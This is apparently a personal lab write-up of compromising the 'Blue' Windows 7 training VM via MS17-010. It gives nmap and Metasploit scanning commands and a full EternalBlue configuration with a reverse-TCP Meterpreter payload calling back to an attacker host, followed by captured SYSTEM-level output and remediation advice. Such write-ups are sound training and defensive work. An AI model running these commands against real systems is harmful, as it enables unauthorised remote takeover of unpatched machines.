Blue

I investigated SMB exposure on an isolated Windows 7 VM and evaluated its MS17-010 attack surface.

Target environment

  • Target: Blue
  • Operating system: Windows 7 SP1
  • Architecture: x64 (64-bit)
  • Service / application: SMB on TCP/445
  • Weakness investigated: MS17-010
  • Scope: Intentionally vulnerable, isolated training VM

1. Enumerate and check SMB

My notes describe discovery on TCP/445 and checks for MS17-010, Microsoft’s update covering SMBv1 vulnerabilities. SMB is Windows’ file-sharing protocol; an open port alone does not establish vulnerability. Blue is the target VM; Kali is the attacker.

sudo nmap -p- -sC -sV -O -T4 192.168.18.5 -oN blue_nmap.txt
nmap -Pn -p445 --script smb-vuln-ms17-010 192.168.18.5

# Metasploit scanner
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.18.5
run

A positive scanner result supports the vulnerability hypothesis; it does not demonstrate command execution. My notes label the scanner output as expected rather than a saved result.

Why this path works: the unpatched SMBv1 service mishandles specially crafted messages, permitting remote code execution. This is a network service vulnerability, not a guessed login. Microsoft’s MS17-010 bulletin documents the affected protocol.

2. Match the payload architecture

My retained configuration screenshot shows the EternalBlue module and x64 Meterpreter payload, which provides Metasploit’s interactive post-exploitation session. This command sequence reflects that configuration:

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.18.5
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.18.4
set LPORT 4444
show options
check
exploit

The supplied walkthrough uses port 2222; the actual captured session uses 4444. Either is a configurable listener port, but 4444 is the historical value shown here. Target and payload architecture must agree.

3. Verify the session

My capture records a successful overwrite and an opened Meterpreter session. whoami at the Meterpreter prompt failed as an unknown command; getuid correctly identified the session:

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
OS: Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture: x64
Meterpreter: x64/windows

These are selected captured lines, with the local machine name omitted. My notes also recommend native shell verification. The commands below are additional methodology, not additional retained output:

# At the Meterpreter prompt
shell
# In the resulting Windows command shell
whoami
whoami /priv
hostname

4. Result and evidence limits

Result: SYSTEM access achieved

I obtained NT AUTHORITY\SYSTEM execution (Windows’ built-in LocalSystem identity) on the isolated Windows 7 SP1 x64 VM using EternalBlue. My saved terminal capture confirms the session and identity; scanner outputs in my notes are expected examples, not retained results.

The saved terminal confirms the module, payload, opened session, and SYSTEM identity. Scanner output in the supplied notes remains illustrative. Original notes record a VM crash, so successful exploitation must not be equated with stability. No remediation retest is claimed.

5. Attack path

  1. SMB discovery
  2. MS17-010 checks
  3. x64 EternalBlue
  4. Meterpreter
  5. NT AUTHORITY\SYSTEM

6. Findings and remediation

Attack / finding

Vulnerable SMB service

The EternalBlue session reached SYSTEM on the isolated Windows 7 VM.

Recommended defensive action

Apply applicable MS17-010 fixes and migrate unsupported Windows systems.

Attack / finding

Legacy protocol exposure

The attack reached the target through its exposed SMB service.

Recommended defensive action

Disable SMBv1 where unnecessary and restrict SMB reachability.
